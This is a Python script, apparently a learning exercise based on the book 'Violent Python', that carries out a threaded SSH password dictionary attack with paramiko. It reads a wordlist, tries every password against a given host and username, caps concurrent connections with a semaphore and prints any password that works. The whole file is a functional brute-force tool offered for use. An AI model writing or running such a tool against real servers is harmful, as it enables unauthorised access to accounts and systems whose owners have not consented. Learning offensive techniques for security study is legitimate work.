#!/usr/bin/env python
import paramiko
import sys
import optparse
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

# Violent Python. Dictionary attack but using paramiko (ny twist of the story)
# Uses threads and limits the number of connections (to 5) using semaphores 

def set_found(i):
  # Interface to modify a global variable called Found (in case the passwd was found
  global Found
  if i == 1:
    Found = True
  else:
    Found = False

def set_pfound(val):
  # And a global variable that will hold the found password (IF)
  global pFound
  pFound = val

def get_passwd_list(dictionary):
  # Function to read the contents of a file and return it as a list (dictionary file)
  f_read = file(dictionary, 'r')
  passwd_list = f_read.readlines()
  return passwd_list

def dict_attck(host, user, passwd):
  # Sets up initial values (username, password)
  # Creates a "client" and loads the Keys for communicating with it
  client = paramiko.SSHClient()
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try :
    # Tries to connect using the passwords found in the list
    # If successful it will print the last passwrod tried, will set the global variables
    # to Found = True and the value of the found password. and exit
    client.connect(host, username = user, password = passwd.replace('\n', ''))
    # Will print a modest message with the found passwd...
    print '[>>>>>> +] Password matched!: %s [<<<<<<<<<]' %(passwd.replace('\n', ''))
    set_found(1)
    set_pfound(passwd.strip('\n'))
    exit(0)
  except paramiko.ssh_exception.AuthenticationException:
    # If there is an Authentication Exception (Bad password) It will print a notification
    print '[-] Failed Password: %s' %(passwd.replace('\n', ''))
  except Exception as e:
    print e
    # In any other case (timeout, server closed connection) it will restart the client and continue the procedure
    client = paramiko.SSHClient()
    client.load_system_host_keys()
  finally:
    # In either case it will close the connection at the end (very polite)
    # And release the connection lock on the thread
    client.close()
    connection_lock.release()

def main():
  global Found
  global pFound
  # Bunch of option parsing
  p = optparse.OptionParser('Usage: %prog -H <host> -u <username> -f <dicttionary file>')
  p.add_option('-H', dest='host', type='string', help='IP address of SSH server')
  p.add_option('-u', dest='user', type='string', help='Username to attack')
  p.add_option('-f', dest='dictionary', type='string', help='Dictionary file')
  (options, args) = p.parse_args()
  host = options.host
  user = options.user
  dictionary = options.dictionary
  if (host == None) or (user == None) or (dictionary == None):
    print p.usage
    exit(0)
  passwd_list = get_passwd_list(dictionary)
  set_found(0)
  for passwd in passwd_list:
  # We will try to connect with each passwd retrieved from the passwords file
    if Found == True:
      # Unless the Found variable has been set to True. In wich case:
      # We will print the value of the recovered passwd and exit
      print '\n  [*] Password found: %s\n\n' %(pFound)
      exit(0)
    # Here we didn't get into the IF. for each connection we will set a lock
    # So we will start a limited number of connections to the server. 
    connection_lock.acquire()
    t = Thread(target=dict_attck, args=(host, user, passwd))
    t.start()
  exit(0)

if __name__ == '__main__':
  main()
